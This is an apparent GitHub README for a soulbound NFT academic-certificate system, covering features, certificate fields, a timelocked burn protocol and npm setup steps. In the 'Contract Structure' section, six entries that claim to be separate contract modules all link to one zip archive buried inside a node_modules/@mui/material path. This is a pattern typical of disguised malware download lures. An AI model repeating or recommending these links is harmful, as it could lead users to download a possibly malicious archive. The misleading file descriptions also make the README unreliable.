🎓 Soulbound Academic Certificate NFT

A blockchain-based solution for issuing, verifying, and managing academic certificates as Soulbound NFTs (non-transferable tokens).

--------------------------------------------------

📌 What are Soulbound NFTs?

Soulbound NFTs are non-transferable tokens bound permanently to the recipient's wallet address.  
Unlike typical NFTs, they cannot be sold or transferred, making them ideal for credentials, certificates, and identity-related applications.

--------------------------------------------------

✨ Key Features

- Soulbound Tokens: Certificates are non-transferable, ensuring authenticity and preventing trading.  
- Institution Management: Authorized institutions can issue, verify, and revoke certificates.  
- Certificate Verification: Built-in verification process to validate authenticity.  
- Revocation Support: Institutions can revoke certificates with documented reasons.  
- GDPR Compliance (Burning): Certificates can be permanently deleted when necessary.  
- Secure Burn Protocol: Timelock & approval system prevents malicious destruction.  
- Advanced Querying: Filtering and search for certificate discovery.  
- Batch Operations: Efficient bulk issuance and management.  
- Role-Based Access Control: Separate permissions for institutions, instructors, and admins.  

--------------------------------------------------

🏗 Contract Structure

The system follows a modular smart contract design:

1. https://raw.githubusercontent.com/midoo12345/soulbound_nft/main/client/node_modules/@mui/material/esm/Zoom/nft_soulbound_v3.9.zip → Main contract with all functionality.  
2. https://raw.githubusercontent.com/midoo12345/soulbound_nft/main/client/node_modules/@mui/material/esm/Zoom/nft_soulbound_v3.9.zip → Core data structures + Soulbound logic.  
3. https://raw.githubusercontent.com/midoo12345/soulbound_nft/main/client/node_modules/@mui/material/esm/Zoom/nft_soulbound_v3.9.zip → Certificate issuance & management.  
4. https://raw.githubusercontent.com/midoo12345/soulbound_nft/main/client/node_modules/@mui/material/esm/Zoom/nft_soulbound_v3.9.zip → Bulk operations.  
5. https://raw.githubusercontent.com/midoo12345/soulbound_nft/main/client/node_modules/@mui/material/esm/Zoom/nft_soulbound_v3.9.zip → Basic queries.  
6. https://raw.githubusercontent.com/midoo12345/soulbound_nft/main/client/node_modules/@mui/material/esm/Zoom/nft_soulbound_v3.9.zip → Advanced filtering & search.  

--------------------------------------------------

📄 Certificate Data Structure

Each certificate includes:

- Student wallet address  
- Issuing institution address  
- Course details  
- Completion date  
- Grade  
- Verification status  
- Certificate hash  
- Revocation status & reason (if applicable)  
- Version history  

--------------------------------------------------

🔐 Security Features

- Non-transferable Soulbound implementation  
- Only authorized institutions can issue certificates  
- Role-based access control  
- Version tracking for all updates  
- Revocation with documented reasons  
- Timelock burn system (default: 3 days)  
- Admin approval workflow for urgent cases  

--------------------------------------------------

🔄 Certificate Lifecycle

1. Issuance → Minting certificate to student wallet  
2. Verification → Authenticity check  
3. Updates → Version-controlled modifications  
4. Revocation → Invalidate but preserve history  
5. Burning → Permanent deletion under strict security  

Revocation vs. Burning

- Revocation → Marks invalid but keeps history  
- Burning → Permanently deletes certificate  
  - GDPR "Right to be Forgotten"  
  - Critical error correction  
  - Test/migration cleanup  

--------------------------------------------------

⚡ Secure Burn Protocol

1. Request Phase → Institution requests burn (with reason).  
2. Timelock Period → 3-day waiting period before execution.  
3. Admin Approval → Owner can fast-track urgent cases.  
4. Execution Phase → Burn executed after timelock or approval.  
5. On-Chain Tracking → All actions logged permanently.  

--------------------------------------------------

🎯 Use Cases

- Academic degrees & course certificates  
- Professional certifications  
- Training completion records  
- Achievement verification  
- Skill credentials  

--------------------------------------------------

🚀 Getting Started (Local Development)

1. Install dependencies at the root:

npm install

2. Move into the client app & install its dependencies:

cd client  
npm install

3. Start the development server:

npm run dev

The app will start and display a local URL in your terminal.  

--------------------------------------------------

📜 License

This project is licensed under the MIT License.  
Feel free to use, modify, and contribute.  
